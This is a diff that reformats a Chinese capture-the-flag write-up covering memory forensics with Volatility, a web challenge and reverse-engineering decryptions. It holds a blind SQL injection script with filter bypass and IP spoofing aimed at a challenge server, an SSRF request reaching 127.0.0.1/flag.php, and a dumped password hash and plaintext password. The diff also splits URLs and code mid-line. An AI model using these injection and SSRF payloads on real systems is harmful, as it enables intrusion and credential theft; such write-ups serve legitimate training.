@@ -37,7 +37,10 @@ Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_
 
 得到test用户的
 
-test:1000:aad3b435b51404eeaad3b435b51404ee:a06a10e99b2d8d53a7514fd0e73d42e1:::
+test:
+1000:
+aad3b435b51404eeaad3b435b51404ee:
+a06a10e99b2d8d53a7514fd0e73d42e1:::
 
 .volatility_2.6_win64_standalone.exe -f 1.raw --profile=Win7SP1x64 lsadump
 
@@ -45,11 +48,13 @@ test:1000:aad3b435b51404eeaad3b435b51404ee:a06a10e99b2d8d53a7514fd0e73d42e1:::
 
 hahaha123
 
-C:Program Files (x86)AdobeReader 9.0ReaderAcroRd32.exe
+C:
+Program Files (x86)AdobeReader 9.0ReaderAcroRd32.exe
 
 .volatility_2.6_win64_standalone.exe -f 1.raw --profile=Win7SP1x64 cmdline
 
-192.168.31.238:4444
+192.168.31.238:
+4444
 
 .volatility_2.6_win64_standalone.exe -f 1.raw --profile=Win7SP1x64 netscan
 
@@ -97,7 +102,8 @@ flag{49059213-a7e2-4e39-b179-953ae9641063}
 
 import requestsimport string
 s="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-url="http://8.147.134.225:45299/"
+url="http://8.147.134.225:
+45299/"
 def check(s): burp0_url = url+"login.php" burp0_headers = {"X-Forwarded-For":"127.0.0.1"} burp0_data = {"username":"admin' aandnd passwoorrd like binary ""+s+"%" -- '1","password":"admin"} print(burp0_data) res=requests.post(burp0_url,headers=burp0_headers,data=burp0_data) return res.text
 t=""
 for k in range(33): for i in s: tmp = t+i if "错误" in check(tmp): print("success:{}".format(tmp)) t+=i break if i== s[-1]: print(t) exit()
@@ -108,14 +114,19 @@ for k in range(33): for i in s: tmp = t+i if "错误" in check(tmp): print("succ
 
 yingyingying
 
-POST /login.php HTTP/1.1Host: 8.147.134.225:45299Content-Length: 36Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://8.147.134.225:45299Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://8.147.134.225:45299/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=08a7e74b575a4ce00c7465dfbc8f341aConnection: closeX-Forwarded-For:127.0.0.1
+POST /login.php HTTP/1.1Host: 8.147.134.225:
+45299Content-Length: 36Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://8.147.134.225:
+45299Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://8.147.134.225:
+45299/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=08a7e74b575a4ce00c7465dfbc8f341aConnection: closeX-Forwarded-For:
+127.0.0.1
 username=admin&password=yingyingying
 
 得到提示
 
 now you can try Download.php?img=static/image/bg
 
-http://8.147.134.225:45299/Download.php?img=http://127.0.0.1/flag.php%23
+http://8.147.134.225:
+45299/Download.php?img=http://127.0.0.1/flag.php%23
 
 flag{49059213-a7e2-4e39-b179-953ae9641063}
 
@@ -202,233 +213,59 @@ EDI安全
 
 ```
 hahaha123
-```
-
-
-
-```
 Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
-```
-
-
-
-```
 .volatility_2.6_win64_standalone.exe -f 1.raw --profile=Win7SP1x64 printkey -K "SAMDomainsAccountUsersNames"
-```
-
-
-
-```
 .volatility_2.6_win64_standalone.exe -f 1.raw --profile=Win7SP1x64 hashdump
-```
-
-
-
-```
-test:1000:aad3b435b51404eeaad3b435b51404ee:a06a10e99b2d8d53a7514fd0e73d42e1:::
-```
-
-
-
-```
+test:
+1000:
+aad3b435b51404eeaad3b435b51404ee:
+a06a10e99b2d8d53a7514fd0e73d42e1:::
 .volatility_2.6_win64_standalone.exe -f 1.raw --profile=Win7SP1x64 lsadump
-```
-
-
-
-```
 hahaha123
-```
-
-
-
-```
-C:Program Files (x86)AdobeReader 9.0ReaderAcroRd32.exe
-```
-
-
-
-```
+C:
+Program Files (x86)AdobeReader 9.0ReaderAcroRd32.exe
 .volatility_2.6_win64_standalone.exe -f 1.raw --profile=Win7SP1x64 cmdline
-```
-
-
-
-```
-192.168.31.238:4444
-```
-
-
-
-```
+192.168.31.238:
+4444
 .volatility_2.6_win64_standalone.exe -f 1.raw --profile=Win7SP1x64 netscan
-```
-
-
-
-```
 118.180.126.13_6770
-```
-
-
-
-```
 vol -f 1.raw --profile=Win7SP1x64 filescan | grep .toml
-```
-
-
-
-```
 livwdaw
-```
-
-
-
-```
 livwdaw
-```
-
-
-
-```
 EccpSOIlRPolP936707
-```
-
-
-
-```
 EccpSOIlRPolP936707
-```
-
-
-
-```
 transferFrom
-```
-
-
-
-```
 flag{49059213-a7e2-4e39-b179-953ae9641063}
-```
-
-
-
-```
 import requestsimport string
 s="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-url="http://8.147.134.225:45299/"
+url="http://8.147.134.225:
+45299/"
 def check(s): burp0_url = url+"login.php" burp0_headers = {"X-Forwarded-For":"127.0.0.1"} burp0_data = {"username":"admin' aandnd passwoorrd like binary ""+s+"%" -- '1","password":"admin"} print(burp0_data) res=requests.post(burp0_url,headers=burp0_headers,data=burp0_data) return res.text
 t=""
 for k in range(33): for i in s: tmp = t+i if "错误" in check(tmp): print("success:{}".format(tmp)) t+=i break if i== s[-1]: print(t) exit()
-```
-
-
-
-```
 90440ad8ff884788ed99747acb0872c0
-```
-
-
-
-```
 yingyingying
-```
-
-
-
-```
-POST /login.php HTTP/1.1Host: 8.147.134.225:45299Content-Length: 36Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://8.147.134.225:45299Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://8.147.134.225:45299/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=08a7e74b575a4ce00c7465dfbc8f341aConnection: closeX-Forwarded-For:127.0.0.1
+POST /login.php HTTP/1.1Host: 8.147.134.225:
+45299Content-Length: 36Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://8.147.134.225:
+45299Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://8.147.134.225:
+45299/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=08a7e74b575a4ce00c7465dfbc8f341aConnection: closeX-Forwarded-For:
+127.0.0.1
 username=admin&password=yingyingying
-```
-
-
-
-```
 now you can try Download.php?img=static/image/bg
-```
-
-
-
-```
-http://8.147.134.225:45299/Download.php?img=http://127.0.0.1/flag.php%23
-```
-
-
-
-```
+http://8.147.134.225:
+45299/Download.php?img=http://127.0.0.1/flag.php%23
 flag{49059213-a7e2-4e39-b179-953ae9641063}
-```
-
-
-
-```
 菜就多练
-```
-
-
-
-```
 flag{61909dd6f4120aac7edb9193491fd83e}
-```
-
-
-
-```
 cccccccccccccccccccccccccccccccccccccc
-```
-
-
-
-```
 0x1C, 0x00, 0x00, 0x00, 0xCB, 0x00, 0x00, 0x00, 0xF5, 0x00, 0x00, 0x00, 0x53, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0xCC, 0x00, 0x00, 0x00, 0x3B, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x7D, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0xD2, 0x00, 0x00, 0x00, 0x56, 0x00, 0x00, 0x00, 0xCE, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x7F, 0x00, 0x00, 0x00, 0xC2, 0x00, 0x00, 0x00, 0xC4, 0x00, 0x00, 0x00, 0x2B, 0x00, 0x00, 0x00, 0x86, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x00, 0x00, 0xF7, 0x00, 0x00, 0x00, 0xEA, 0x00, 0x00, 0x00, 0xFB, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x9A, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x01, 0x48, 0x0F, 0x00, 0x08
-```
-
-
-
-```
 0x4E, 0xAC, 0x96, 0x23, 0xE8, 0xB9, 0x0E, 0x18, 0x6A, 0x5D, 0x92, 0xB5, 0x68, 0xFA, 0x64, 0x8B, 0xCA, 0x0C, 0xFF, 0xAD, 0x17, 0xA7, 0x07, 0xC5, 0x93, 0xCD, 0xD3, 0xD2, 0x5A, 0x07, 0xA6, 0x36, 0x20, 0x97, 0xE2, 0x0D, 0x79, 0x0B, 0x00
-```
-
-
-
-```
 Whatareyourencryption&decryptionbasics
-```
-
-
-
-```
-#include<stdio.h>#include<string.h>int main(){ char a[50]="cccccccccccccccccccccccccccccccccccccc"; char b[200]={0x1C, 0x00, 0x00, 0x00, 0xCB, 0x00, 0x00, 0x00, 0xF5, 0x00, 0x00, 0x00, 0x53, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0xCC, 0x00, 0x00, 0x00, 0x3B, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x7D, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0xD2, 0x00, 0x00, 0x00, 0x56, 0x00, 0x00, 0x00, 0xCE, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x7F, 0x00, 0x00, 0x00, 0xC2, 0x00, 0x00, 0x00, 0xC4, 0x00, 0x00, 0x00, 0x2B, 0x00, 0x00, 0x00, 0x86, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x00, 0x00, 0xF7, 0x00, 0x00, 0x00, 0xEA, 0x00, 0x00, 0x00, 0xFB, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x9A, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x01, 0x48, 0x0F, 0x00, 0x08}; char c[50]="Whatareyourencryption&decryptionbasics"; char d[50]={0x4E, 0xAC, 0x96, 0x23, 0xE8, 0xB9, 0x0E, 0x18, 0x6A, 0x5D, 0x92, 0xB5, 0x68, 0xFA, 0x64, 0x8B, 0xCA, 0x0C, 0xFF, 0xAD, 0x17, 0xA7, 0x07, 0xC5, 0x93, 0xCD, 0xD3, 0xD2, 0x5A, 0x07, 0xA6, 0x36, 0x20, 0x97, 0xE2, 0x0D, 0x79, 0x0B, 0x00}; for(int i=0;i<38*4;i+=4) { printf("%d,",b[i]); } char f[100]={28,-53,-11,83,-111,-52,59,102,4,125,-70,-46,86,-50,20,-92,-24,127,-62,-60,43,-122,50,-16,-9,-22,-5,-16,120,52,-102,3,19,-94,-111,55,72,102}; for(int i=0;i<38;i++) { a[i]=a[i]^d[i]^c[i]^f[i]; printf("%c",a[i]); } return 0;}
-```
-
-
-
-```
+    #include<stdio.h>#include<string.h>int main(){ char a[50]="cccccccccccccccccccccccccccccccccccccc"; char b[200]={0x1C, 0x00, 0x00, 0x00, 0xCB, 0x00, 0x00, 0x00, 0xF5, 0x00, 0x00, 0x00, 0x53, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0xCC, 0x00, 0x00, 0x00, 0x3B, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x7D, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0xD2, 0x00, 0x00, 0x00, 0x56, 0x00, 0x00, 0x00, 0xCE, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x7F, 0x00, 0x00, 0x00, 0xC2, 0x00, 0x00, 0x00, 0xC4, 0x00, 0x00, 0x00, 0x2B, 0x00, 0x00, 0x00, 0x86, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x00, 0x00, 0xF7, 0x00, 0x00, 0x00, 0xEA, 0x00, 0x00, 0x00, 0xFB, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x9A, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x01, 0x48, 0x0F, 0x00, 0x08}; char c[50]="Whatareyourencryption&decryptionbasics"; char d[50]={0x4E, 0xAC, 0x96, 0x23, 0xE8, 0xB9, 0x0E, 0x18, 0x6A, 0x5D, 0x92, 0xB5, 0x68, 0xFA, 0x64, 0x8B, 0xCA, 0x0C, 0xFF, 0xAD, 0x17, 0xA7, 0x07, 0xC5, 0x93, 0xCD, 0xD3, 0xD2, 0x5A, 0x07, 0xA6, 0x36, 0x20, 0x97, 0xE2, 0x0D, 0x79, 0x0B, 0x00}; for(int i=0;i<38*4;i+=4) { printf("%d,",b[i]); } char f[100]={28,-53,-11,83,-111,-52,59,102,4,125,-70,-46,86,-50,20,-92,-24,127,-62,-60,43,-122,50,-16,-9,-22,-5,-16,120,52,-102,3,19,-94,-111,55,72,102}; for(int i=0;i<38;i++) { a[i]=a[i]^d[i]^c[i]^f[i]; printf("%c",a[i]); } return 0;}
 flag{d3db69a34a51d7e1d23d621590827c01}
-```
-
-
-
-```
 delta = 555885348
-```
-
-
-
-```
 key = [1900550021, 2483099539, 2205172504, 1359557939]arr = [ [392252415, 2941946969], [1122976151, 1335193774], [815478816, 2529100980], [2237049875, 188954780]]
-```
-
-
-
-```
-#include <stdio.h>#include <stdint.h> /* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i < num_rounds; i++) { v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]); sum += delta; v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]); } v[0]=v0; v[1]=v1;} void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=555885348, sum=delta*num_rounds; for (i=0; i < num_rounds; i++) { v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]); sum -= delta; v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]); } v[0]=v0; v[1]=v1;} int main(){ uint32_t v[]={392252415, 2941946969,1122976151, 1335193774,815478816, 2529100980,2237049875, 188954780}; uint32_t const k[4]={1900550021, 2483099539, 2205172504, 1359557939}; unsigned int r=32;//num_rounds建议取值为32 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf("加密前原始数据：%u %un",v[0],v[1]);// encipher(r, v, k);// printf("加密后的数据：%u %un",v[0],v[1]); decipher(r, v, k); decipher(r, v+2, k); decipher(r, v+4, k); decipher(r, v+6, k);// printf("解密后的数据：%x %n",v[0],v[1]); printf("%s",v); return 0;}
-```
-
-
-
-```
+    #include <stdio.h>#include <stdint.h> /* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i < num_rounds; i++) { v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]); sum += delta; v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]); } v[0]=v0; v[1]=v1;} void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=555885348, sum=delta*num_rounds; for (i=0; i < num_rounds; i++) { v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]); sum -= delta; v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]); } v[0]=v0; v[1]=v1;} int main(){ uint32_t v[]={392252415, 2941946969,1122976151, 1335193774,815478816, 2529100980,2237049875, 188954780}; uint32_t const k[4]={1900550021, 2483099539, 2205172504, 1359557939}; unsigned int r=32;//num_rounds建议取值为32 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf("加密前原始数据：%u %un",v[0],v[1]);// encipher(r, v, k);// printf("加密后的数据：%u %un",v[0],v[1]); decipher(r, v, k); decipher(r, v+2, k); decipher(r, v+4, k); decipher(r, v+6, k);// printf("解密后的数据：%x %n",v[0],v[1]); printf("%s",v); return 0;}
 flag{acb8739759dc496ccc945703037e037f}
 ```
 
